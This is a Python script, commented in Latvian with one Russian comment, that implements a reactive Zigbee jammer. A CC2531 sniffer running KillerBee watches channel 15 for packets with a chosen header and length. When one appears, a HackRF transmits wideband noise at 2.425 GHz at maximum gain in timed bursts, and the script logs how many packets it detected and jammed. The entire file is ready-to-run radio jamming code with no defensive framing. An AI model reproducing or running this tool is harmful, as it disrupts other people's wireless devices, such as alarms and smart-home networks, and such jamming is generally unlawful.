import logging
import numpy as np
from SoapySDR import Device, SOAPY_SDR_TX
from killerbee import KillerBee
import time
import threading

# Logging iestatījumi
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# HackRF parametri
CENTER_FREQ = 2.425e9  # Zigbee 15 kanāls
SAMPLE_RATE = 2e6  # Diskretizācijas frekvence
AMPLITUDE = 1.0  # Amplitūda
TX_DURATION = 3.0  # Viena bloķēšanas cikla ilgums
GAIN = 47  # Maksimālais signāla pastiprinājums
ZIGBEE_CHANNEL = 15

# Paketes parametri
MIN_PACKET_LENGTH = 40
MAX_PACKET_LENGTH = 60
HEADERS_TO_DETECT = [b"\xAA\xBB"]

stop_event = threading.Event()
jam_event = threading.Event()
detected_packets = 0
jammed_packets = 0
potentially_jammed_packets = 0

# Platjoslas trokšņa ģenerēšana
def generate_wideband_noise(sample_count, intensity):
    noise = (np.random.uniform(-intensity, intensity, sample_count) +
             1j * np.random.uniform(-intensity, intensity, sample_count)).astype(np.complex64)
    return noise

# Adaptīvā slāpēšana
def adaptive_jamming(sdr, freq, duration, intensity):
    global potentially_jammed_packets
    try:
        sdr.setSampleRate(SOAPY_SDR_TX, 0, SAMPLE_RATE)
        sdr.setFrequency(SOAPY_SDR_TX, 0, freq)
        sdr.setGain(SOAPY_SDR_TX, 0, GAIN)
        tx_stream = sdr.setupStream(SOAPY_SDR_TX, "CF32")
        sdr.activateStream(tx_stream)

        start_time = time.time()
        while time.time() - start_time < duration and not stop_event.is_set():
            noise = generate_wideband_noise(int(SAMPLE_RATE), intensity)
            sdr.writeStream(tx_stream, [noise], len(noise))
            potentially_jammed_packets += 1  
            time.sleep(0.1)

        sdr.deactivateStream(tx_stream)
        sdr.closeStream(tx_stream)
        logging.info("Noveršanas pabeigta.")
    except Exception as e:
        logging.error(f"Slāpēšanas kļuda: {e}")

# CC2531 sniffers
def sniff_with_cc2531():
    global detected_packets, jam_event
    try:
        kb = KillerBee(device="1:2")
        kb.set_channel(ZIGBEE_CHANNEL)
        logging.info(f"Zigbee sniffers CC2531: {ZIGBEE_CHANNEL}.")

        while not stop_event.is_set():
            packet = kb.pnext()
            if packet:
                payload = packet.get("bytes", b"")
                header = payload[:2]
                packet_length = len(payload)

                logging.info(f"CC2531: Paketes garums: {packet_length} baits, Galvēne: {header.hex()}")

                if header in HEADERS_TO_DETECT and MIN_PACKET_LENGTH <= packet_length <= MAX_PACKET_LENGTH:
                    detected_packets += 1
                    logging.warning(f"CC2531: Atklāts pakete ar garumu {packet_length} baits")
                    jam_event.set()  # Запуск глушения
    except Exception as e:
        logging.error(f"CC2531 kļuda: {e}")
    finally:
        kb.close()
        logging.info("CC2531 darbības aptūreta.")

# Parvaldības elements
def main(runtime):
    global jammed_packets, potentially_jammed_packets
    try:
        sniff_thread = threading.Thread(target=sniff_with_cc2531)
        sniff_thread.start()

        # HackRF inicializācija
        sdr = Device(dict(driver="hackrf"))
        logging.info(f"HackRF veiksmīgi inicializēts.")

        start_time = time.time()
        while time.time() - start_time < runtime:
            if stop_event.is_set():
                break
            if jam_event.is_set():
                logging.info("HackRF: Adaptīvās bloķēšanas sākšana...")
                adaptive_jamming(sdr, CENTER_FREQ, TX_DURATION, AMPLITUDE)
                jammed_packets += 1
                jam_event.clear()
            time.sleep(0.1)

        stop_event.set()
        sniff_thread.join()

        # Statistika
        logging.info(f"Atklāto pakešu skaits: {detected_packets}")
        logging.info(f"Novērstu paketes skaits: {jammed_packets}")
        logging.info(f"Potenciāli bloķēto pakešu skaits: {potentially_jammed_packets}")
    except KeyboardInterrupt:
        logging.info("Programmas partrakūma process.")
    except Exception as e:
        logging.error(f"Kļuda: {e}")
    finally:
        stop_event.set()
        if 'sdr' in locals():
            del sdr

if __name__ == "__main__":
    runtime = 120  # Programmas darbības ilgums
    main(runtime)
